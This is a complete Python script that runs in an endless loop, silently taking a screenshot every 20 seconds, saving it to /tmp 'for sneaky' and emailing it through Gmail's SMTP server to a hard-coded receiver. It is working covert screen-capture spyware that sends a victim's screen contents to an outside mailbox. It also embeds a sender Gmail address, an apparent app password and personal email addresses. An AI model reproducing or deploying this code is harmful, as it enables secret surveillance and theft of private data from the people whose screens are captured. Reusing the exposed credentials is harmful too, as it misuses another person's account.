#!/usr/bin/env python3

import pyautogui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import time


def screen_image(image_path):       #function for screen shot
    screen_shoot=pyautogui.screenshot() 
    screen_shoot.save(image_path)   #the image saved in /tmp path for sneaky
    # print("screen shot generated !")

def send_mail(sender_email,sender_password,receiver_email,subject,image_path):  #function for send email
    message=MIMEMultipart()
    message['From']=sender_email
    message['To']=receiver_email
    message['Subject']=subject
    with open(image_path,'rb') as file: #open the image and read in binary mode
        image=MIMEImage(file.read())    #convert image as mimeImage
        image.add_header('content-disposition','attachment',filename='screenshot.jpg') #add-header for image
        message.attach(image)
    message_string=message.as_string()  #covert the msg as string
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587) #login to the server
        server.starttls()   #start tls for secure connection
        server.login(sender_email,sender_password)
        # print("login success")
        server.send_message(message,message_string)
        # print("email-sent successfully")
    except Exception as e:
        print("An error occured "+str(e))
    finally:
        server.quit()

sender_email="02042003sureshk@gmail.com" 
sender_password="btevgjjsycjgrefi" #google app password to be generated it look likes this tevgjjsycjgrefi
receiver_email="veludhanapathi@gmail.com"
subject="screeenshot received @ successfully !" 
image_path="/tmp/screen.png"
if __name__ == "__main__":
    while True:
        screen_image(image_path)
        send_mail(sender_email,sender_password,receiver_email,subject,image_path)
        time.sleep(20)